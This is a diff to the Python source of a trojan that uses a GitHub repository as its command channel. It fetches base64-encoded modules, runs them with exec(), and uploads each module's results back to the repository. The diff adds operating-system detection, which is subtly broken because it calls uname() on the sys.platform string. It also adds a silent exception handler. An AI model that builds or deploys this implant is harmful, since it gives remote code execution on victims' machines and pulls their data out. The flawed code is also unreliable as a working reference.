@@ -4,6 +4,7 @@ import importlib
 import json
 import random
 import sys
+from sys import platform
 import threading
 import time
 
@@ -21,23 +22,30 @@ def github_connect():
 def get_file_contents(dirname, module_name, repo):
     return repo.file_contents(f'{dirname}/{module_name}').content
 
+def get_os():
+    if platform == "win32":
+        return "windows"
+    else:
+        return platform.uname()
 
 class GitImporter:
     def __init__(self):
         self.current_module_code = ""
 
     def find_module(self, name, path=None):
-        print("[*] Attempting to retrieve %s" % name)
-        self.repo = github_connect()
+        try:
+            print("[*] Attempting to retrieve %s" % name)
+            self.repo = github_connect()
 
-        new_library = get_file_contents('modules', f'{name}.py', self.repo)
-        if new_library is not None:
-            self.current_module_code = base64.b64decode(new_library)
-            return self
-
+            new_library = get_file_contents('modules', f'{name}.py', self.repo)
+            if new_library is not None:
+                self.current_module_code = base64.b64decode(new_library)
+                return self
+        except:
+            print("Failed to import =" + name)
+            
     def load_module(self, name):
-        spec = importlib.util.spec_from_loader(name, loader=None,
-                                               origin=self.repo.git_url)
+        spec = importlib.util.spec_from_loader(name, loader=None,origin=self.repo.git_url)
         new_module = importlib.util.module_from_spec(spec)
         exec(self.current_module_code, new_module.__dict__)
         sys.modules[spec.name] = new_module
@@ -50,6 +58,7 @@ class Trojan:
         self.config_file = f'{id}.json'
         self.data_path = f'data/{id}/'
         self.repo = github_connect()
+        self.os = get_os()
 
     def get_config(self):
         config_json = get_file_contents('config', self.config_file, self.repo)
@@ -61,12 +70,12 @@ class Trojan:
         return config
 
     def module_runner(self, module):
-        result = sys.modules[module].run()
-        self.store_module_result(result)
+        result = sys.modules[module].run(self.os)
+        self.store_module_result(result, module)
 
-    def store_module_result(self, data):
+    def store_module_result(self, data, module):
         message = datetime.now().isoformat()
-        remote_path = f'data/{self.id}/{message}.data'
+        remote_path = f'data/{message}.data'
         bindata = bytes('%r' % data, 'utf-8')
         self.repo.create_file(remote_path, message, base64.b64encode(bindata))
 
@@ -75,8 +84,7 @@ class Trojan:
             config = self.get_config()
             for task in config:
                 thread = threading.Thread(
-                    target=self.module_runner,
-                    args=(task['module'],))
+                    target=self.module_runner, args=(task['module'],))
                 thread.start()
                 time.sleep(random.randint(1, 10))
 
